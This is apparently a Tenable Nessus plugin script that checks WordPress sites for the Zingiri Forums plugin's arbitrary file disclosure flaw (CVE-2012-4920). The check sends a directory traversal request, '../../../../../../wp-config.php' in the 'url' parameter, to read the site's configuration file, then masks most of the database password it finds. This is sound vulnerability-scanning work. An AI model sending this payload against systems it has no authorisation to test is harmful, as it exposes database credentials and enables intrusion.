#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(64248);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2016/12/12 19:19:06 $");

  script_cve_id("CVE-2012-4920");
  script_bugtraq_id(57224);
  script_osvdb_id(89069);

  script_name(english:"Forums Plugin for WordPress 'url' Parameter Arbitrary File Disclosure");
  script_summary(english:"Attempts to view the wp-config.php file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by an
information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Forums Plugin for WordPress installed on the remote host is
affected by an information disclosure vulnerability due to a failure
to properly sanitize user-supplied input to the 'url' parameter of the
zing_forum_output() function in the zingiri-forum/forum.php script. An
unauthenticated, remote attacker can exploit this, by sending a
request containing directory traversal sequences, to read arbitrary
files subject to the privileges under which the web server runs.");
  # http://ceriksen.com/2013/01/12/wordpress-zingiri-forums-arbitrary-file-disclosure/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?4504ff94");
  script_set_attribute(attribute:"see_also", value:"http://wordpress.org/extend/plugins/zingiri-forum/changelog/");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Forums Plugin version 1.4.4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/01/09");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/01/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/01/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# Verify Plugin is installed
plugin = 'Forums';
# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "zingiri-forum/zing.css"][0] = make_list('\\.zingbody th');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

attack = "/?zforum=css&url=../../../../../../wp-config.php";
output = '';

url_path = install['Redirect'];
if (!isnull(url_path))
{
  url = ereg_replace(string:url_path, pattern:"/$", replace:"");
  url = url + attack;
}
else url = dir + "/" + attack;

res = http_send_recv3(
  method       : "GET",
  item         : url,
  port         : port,
  exit_on_fail : TRUE
);

if (
  "base configurations of the WordPress" >< res[2] &&
  "* @package WordPress" >< res[2]
)
{
   # Format our output for reporting
   full_page = strstr(res[2], " * The base configurations");
   pos = stridx(full_page, "/** The Database Collate type.");
   output = substr(full_page, 0, pos-1);

   # Mask password except first and last characters
   get_pass = eregmatch(pattern:"'DB_PASSWORD', '(.+)'", string:output);

   if (!isnull(get_pass))
   {
     pass = get_pass[1];
     pass2 = strcat(pass[0], crap(data:'*', length:15), pass[strlen(pass)-1]);
     output = str_replace(string:output, find:pass, replace:pass2);
   }

   extra = 'Note that a password has been partially obfuscated in the truncated' + '\nfile displayed below.';

   security_report_v4(
     port       : port,
     severity   : SECURITY_WARNING,
     generic    : TRUE,
     request    : make_list(install_url + attack),
     output     : chomp(output),
     rep_extra  : extra
   );
   exit(0);
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
